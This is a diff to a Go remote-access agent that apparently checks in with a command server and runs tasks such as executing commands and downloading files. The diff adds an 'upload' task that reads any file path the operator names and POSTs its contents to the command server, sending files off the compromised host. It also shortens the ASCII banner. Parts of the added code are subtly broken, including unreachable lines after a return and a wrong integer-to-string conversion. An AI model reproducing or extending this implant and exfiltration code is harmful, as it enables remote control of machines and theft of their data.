@@ -7,6 +7,9 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"io/ioutil"
+	"mime/multipart"
+	"path"
 	"time"
 
 	// "io/ioutil"
@@ -68,13 +71,13 @@ var p = fmt.Println
 func main() {
 
 	Banner := `
-███████████████████████████████████████████████████████████████████████████████████████████████
-███    ██ ██  ██████ ███████  ██████ ██████       █████   ██████  ███████ ███    ██ ████████  
-████   ██ ██ ██      ██      ██           ██     ██   ██ ██       ██      ████   ██    ██    
-██ ██  ██ ██ ██      █████   ██       █████      ███████ ██   ███ █████   ██ ██  ██    ██    
-██  ██ ██ ██ ██      ██      ██      ██          ██   ██ ██    ██ ██      ██  ██ ██    ██    
-██   ████ ██  ██████ ███████  ██████ ███████     ██   ██  ██████  ███████ ██   ████    ██    
-███████████████████████████████████████████████████████████████████████████████████████████████                                                                                                                                                                                       
+███████████████████████████████████████████████
+   █████   ██████  ███████ ███    ██ ████████  
+  ██   ██ ██       ██      ████   ██    ██    
+  ███████ ██   ███ █████   ██ ██  ██    ██    
+  ██   ██ ██    ██ ██      ██  ██ ██    ██    
+  ██   ██  ██████  ███████ ██   ████    ██    
+███████████████████████████████████████████████                                                                                                                                                                            
 `
 
 	fmt.Println(Banner)
@@ -197,6 +200,8 @@ func checkIn() {
 		go handle_runCommand(post.TaskID, post.Arg)
 	case "download":
 		go handle_download(post.TaskID, post.Arg)
+	case "upload":
+		go uploadFile(post.TaskID, post.Arg)
 	default:
 		// Well if it doesn't match 🤷‍♀️
 
@@ -317,6 +322,95 @@ func handle_download(this_taskID string, args string) {
 		return
 	}
 
+}
+
+func uploadFile(this_taskID string, filepath string) error {
+
+	if _, err := os.Stat(filepath); errors.Is(err, os.ErrNotExist) {
+		// path/to/whatever does not exist
+
+		response := Task_Response{this_taskID, "Failed", "Can't find the file"}
+		send_response(response)
+	}
+
+	file, err := os.Open(filepath)
+	if err != nil {
+		return err
+		response := Task_Response{this_taskID, "Failed", "Can't open the file"}
+		send_response(response)
+
+	}
+	defer file.Close()
+
+	body := new(bytes.Buffer)
+	writer := multipart.NewWriter(body)
+
+	filename := path.Base(filepath)
+
+	// Create a form field with the file name
+	part, err := writer.CreateFormFile("file", filename)
+	if err != nil {
+		return err
+	}
+
+	// Copy the file contents to the form field
+	_, err = io.Copy(part, file)
+	if err != nil {
+		return err
+	}
+
+	// Close the multipart writer
+	err = writer.Close()
+	if err != nil {
+		return err
+	}
+
+	// Create a new request with the multipart body
+	req, err := http.NewRequest("POST", command_server+"/upload", body)
+	if err != nil {
+
+		fmt.Println("Can't creatr a new request")
+		response := Task_Response{this_taskID, "Failed", "Can't creat new request with the multipart body"}
+		send_response(response)
+
+		return err
+	}
+
+	// Set the Content-Type header to the multipart boundary
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	// Send the request
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		body, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+
+			// fmt.Println("failed to upload file " + string(resp.StatusCode))
+			fmt.Println(resp.StatusCode)
+
+			response := Task_Response{this_taskID, "Failed", "failed to upload file " + string(resp.StatusCode)}
+			send_response(response)
+			return fmt.Errorf("Failed to upload file. Status code: %d", resp.StatusCode)
+
+		}
+
+		fmt.Println(resp.StatusCode)
+
+		response := Task_Response{this_taskID, "Failed", "failed to upload file " + string(resp.StatusCode)}
+		send_response(response)
+		return fmt.Errorf("Failed to upload file. Status code: %d. Response body: %s", resp.StatusCode, string(body))
+	}
+
+	response := Task_Response{this_taskID, "Success", "File retrieved"}
+	send_response(response)
+
+	return nil
 }
 
 func downloadFile(filename string, filepath string, this_taskID string) error {
